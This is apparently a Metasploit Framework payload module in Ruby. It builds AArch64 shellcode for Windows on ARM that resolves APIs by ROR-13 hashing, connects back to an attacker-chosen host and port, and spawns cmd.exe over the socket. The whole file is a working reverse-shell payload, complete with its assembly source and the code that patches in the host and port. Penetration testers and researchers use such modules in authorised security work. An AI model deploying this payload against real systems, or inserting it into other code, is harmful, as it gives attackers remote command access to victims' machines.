##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 664

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Command Shell, Reverse TCP Inline',
        'Description' => %q{
          Connect back to the attacker and spawn a Windows command shell on a
          Windows on ARM (AArch64) target. Position-independent shellcode that
          resolves API addresses via PEB / Export Address Table hashing
          (Stephen Fewer ROR-13), opens a TCP socket through Winsock, calls
          WSAConnect, then spawns cmd.exe with stdin/stdout/stderr piped over
          the socket via CreateProcessA + STARTF_USESTDHANDLES. EXITFUNC is
          honored via a runtime hash-dispatcher.
        },
        'Author' => [
          'vinicius-batistella' # AArch64 reverse_tcp port from the x64 stager logic
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'Payload' => { 'Offsets' => {}, 'Payload' => '' },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def generate(_opts = {})
    ip_bytes = Rex::Socket.addr_aton(datastore['LHOST'])

    # Map LHOST/LPORT onto the MOVK immediates inside fill_sockaddr_fast.
    # sin_port:  network-order bytes loaded as a little-endian 16-bit imm.
    # sin_addr:  octets 0..1 -> low halfword, octets 2..3 -> high halfword.
    port_imm = [datastore['LPORT'].to_i].pack('n').unpack1('v')
    ip_lo_imm = ip_bytes[0, 2].unpack1('v')
    ip_hi_imm = ip_bytes[2, 2].unpack1('v')

    # The exitfunk block re-resolves the chosen kernel32 exit API by hash
    # at runtime; we patch the two MOVZ/MOVK immediates with the hash.
    exit_hash = exitfunk_hash(datastore['EXITFUNC'])

    asm = build_asm(
      port_imm: port_imm,
      ip_lo_imm: ip_lo_imm,
      ip_hi_imm: ip_hi_imm,
      exit_lo: exit_hash & 0xFFFF,
      exit_hi: (exit_hash >> 16) & 0xFFFF
    )

    compile_aarch64(asm)
  end

  private

  # ROR-13 hash of a kernel32 export name, matching the asm find_function
  # routine. The asm stops on CBZ before adding the NUL terminator, so we
  # hash bytes only (no trailing zero).
  #
  # Sanity checks (verified against rev2.s constants):
  #   ror13_hash('TerminateProcess') == 0x78b5b983
  #   ror13_hash('LoadLibraryA')     == 0xec0e4e8e
  #   ror13_hash('CreateProcessA')   == 0x16b3fe72
  def ror13_hash(str)
    h = 0
    str.each_byte do |b|
      h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
      h = (h + b) & 0xFFFFFFFF
    end
    h
  end

  def exitfunk_hash(value)
    case value.to_s.downcase
    when 'thread'
      ror13_hash('ExitThread')
    when 'process', ''
      0x78b5b983 # TerminateProcess (known constant; also == ror13_hash('TerminateProcess'))
    when 'none'
      # 'none' is best-effort here: we still need *something* to call so the
      # shellcode doesn't fall off into garbage. ExitProcess is the safest.
      ror13_hash('ExitProcess')
    else
      0x78b5b983
    end
  end

  def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exit_lo:, exit_hi:)
    # Differences from the standalone rev2.s prototype:
    #   - `.text` / `.global` directives stripped (aarch64 gem rejects them)
    #   - `[reg, wreg, uxtw #N]` rewritten as `mov w15, w4; lsl x15, x15, #N;
    #     add x15, base, x15; ldr ...` to avoid extended-register addressing
    #     in the aarch64 gem parser
    #   - constant expressions like `(12*2)` pre-evaluated to literals
    #   - `mov x0, #-1` replaced with `movn x0, #0` (canonical encoding)
    #
    # Slot table (x29 + offset):
    #   0x00 kernel32_base  0x08 &find_function  0x18 LoadLibraryA
    #   0x28 WSAStartup     0x30 WSASocketA      0x38 WSAConnect
    #   0x40 CreateProcessA 0x50 sockaddr_in     0x70 WSADATA
    # Gaps at 0x10 and 0x20 are intentional -- previously held cached
    # TerminateProcess (re-resolved by exitfunk now) and OpenProcessToken
    # (was unused dead code), preserved to keep slot offsets stable.
    <<~ASM
      main:
        sub     sp, sp, #0x300
        mov     x29, sp
        add     x19, x29, #0x50
        add     x21, x29, #0x70

      find_kernel32:
        ldr     x6, [x18, #0x60]
        ldr     x6, [x6,  #0x18]
        ldr     x6, [x6,  #0x30]

      next_module:
        ldr     x3, [x6, #0x10]
        ldr     x7, [x6, #0x40]
        ldr     x6, [x6]
        ldrh    w8, [x7, #24]
        cbnz    w8, next_module

      find_function_shorten:
        b       find_function_shorten_bnc

      find_function_ret:
        str     x30, [x29, #0x08]
        b       resolve_symbols_kernel32

      find_function_shorten_bnc:
        bl      find_function_ret

      find_function:
        mov     w10, w0
        ldr     w8,  [x3, #0x3c]
        add     x8,  x8, x3
        ldr     w9,  [x8, #0x88]
        add     x9,  x9, x3
        ldr     w4,  [x9, #0x18]
        ldr     w11, [x9, #0x20]
        add     x11, x11, x3

      find_function_loop:
        cbz     w4, find_function_finished
        sub     w4, w4, #1
        mov     w15, w4
        lsl     x15, x15, #2
        add     x15, x11, x15
        ldr     w12, [x15]
        add     x6,  x12, x3

      compute_hash:
        mov     w5, wzr

      compute_hash_again:
        ldrb    w0, [x6], #1
        cbz     w0, compute_hash_finished
        ror     w5, w5, #13
        add     w5, w5, w0
        b       compute_hash_again

      compute_hash_finished:
      find_function_compare:
        cmp     w5, w10
        b.ne    find_function_loop

        ldr     w12, [x9, #0x24]
        add     x12, x12, x3
        mov     w15, w4
        lsl     x15, x15, #1
        add     x15, x12, x15
        ldrh    w4,  [x15]
        ldr     w12, [x9, #0x1c]
        add     x12, x12, x3
        mov     w15, w4
        lsl     x15, x15, #2
        add     x15, x12, x15
        ldr     w13, [x15]
        add     x0,  x13, x3

      find_function_finished:
        ret

      resolve_symbols_kernel32:
        str     x3, [x29, #0x00]

        movz    w0, #0x4e8e
        movk    w0, #0xec0e, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x18]

      resolve_symbols_CreateProcessA:
        movz    w0, #0xfe72
        movk    w0, #0x16b3, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x40]

      load_ws2_32:
        movz    x0, #0x7357
        movk    x0, #0x5f32, lsl #16
        movk    x0, #0x3233, lsl #32
        movk    x0, #0x642e, lsl #48
        movz    w1, #0x6c6c
        sub     sp, sp, #16
        str     x0, [sp]
        str     w1, [sp, #8]
        mov     x0, sp
        ldr     x9, [x29, #0x18]
        blr     x9
        add     sp, sp, #16
        mov     x3, x0

      resolve_ws2_32:
        movz    w0, #0xedcb
        movk    w0, #0x3bfc, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x28]

        movz    w0, #0x09d9
        movk    w0, #0xadf5, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x30]

        movz    w0, #0xba0c
        movk    w0, #0xb32d, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x38]

      call_WSAStartup:
        movz    w0, #0x0202
        mov     x1, x21
        ldr     x9, [x29, #0x28]
        blr     x9

      call_WSASocket:
        mov     w0, #2
        mov     w1, #1
        mov     w2, #6
        mov     x3, xzr
        mov     w4, wzr
        mov     w5, wzr
        ldr     x9, [x29, #0x30]
        blr     x9
        mov     x22, x0

      fill_sockaddr_fast:
        movz    x0, #0x0002
        movk    x0, ##{format('0x%04x', port_imm)}, lsl #16
        movk    x0, ##{format('0x%04x', ip_lo_imm)}, lsl #32
        movk    x0, ##{format('0x%04x', ip_hi_imm)}, lsl #48
        stp     x0, xzr, [x19]

      call_WSAConnect:
        mov     x0, x22
        mov     x1, x19
        mov     w2, #16
        mov     x3, xzr
        mov     x4, xzr
        mov     x5, xzr
        mov     x6, xzr
        ldr     x9, [x29, #0x38]
        blr     x9

      build_PROCESS_INFORMATION_and_STARTUPINFOA:
        sub     sp, sp, #0xB0
        add     x10, sp, #0x10
        add     x11, sp, #0x30
        add     x12, sp, #0xA0

        stp     xzr, xzr, [x10]
        str     xzr, [x10, #16]

        stp     xzr, xzr, [x11, #0x00]
        stp     xzr, xzr, [x11, #0x10]
        stp     xzr, xzr, [x11, #0x20]
        stp     xzr, xzr, [x11, #0x30]
        stp     xzr, xzr, [x11, #0x40]
        stp     xzr, xzr, [x11, #0x50]
        str     xzr,      [x11, #0x60]

        mov     w0, #0x68
        str     w0, [x11, #0x00]
        mov     w0, #0x100
        str     w0, [x11, #0x3C]
        str     x22, [x11, #0x50]
        str     x22, [x11, #0x58]
        str     x22, [x11, #0x60]

        movz    x0, #0x6D63
        movk    x0, #0x2E64, lsl #16
        movk    x0, #0x7865, lsl #32
        movk    x0, #0x0065, lsl #48
        str     x0, [x12]

      call_CreateProcessA:
        mov     x0, xzr
        mov     x1, x12
        mov     x2, xzr
        mov     x3, xzr
        mov     w4, #1
        mov     w5, wzr
        mov     x6, xzr
        mov     x7, xzr
        stp     x11, x10, [sp]

        ldr     x9, [x29, #0x40]
        blr     x9

        add     sp, sp, #0xB0

      exitfunk:
        ldr     x3, [x29, #0x00]
        movz    w0, ##{format('0x%04x', exit_lo)}
        movk    w0, ##{format('0x%04x', exit_hi)}, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        mov     x10, x0
        movn    x0, #0
        mov     w1, wzr
        blr     x10
        brk     #0
    ASM
  end

  def compile_aarch64(asm_string)
    require 'aarch64/parser'
    parser = ::AArch64::Parser.new
    asm = parser.parse(without_inline_comments(asm_string))
    asm.to_binary
  end

  def without_inline_comments(string)
    string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
  end
end
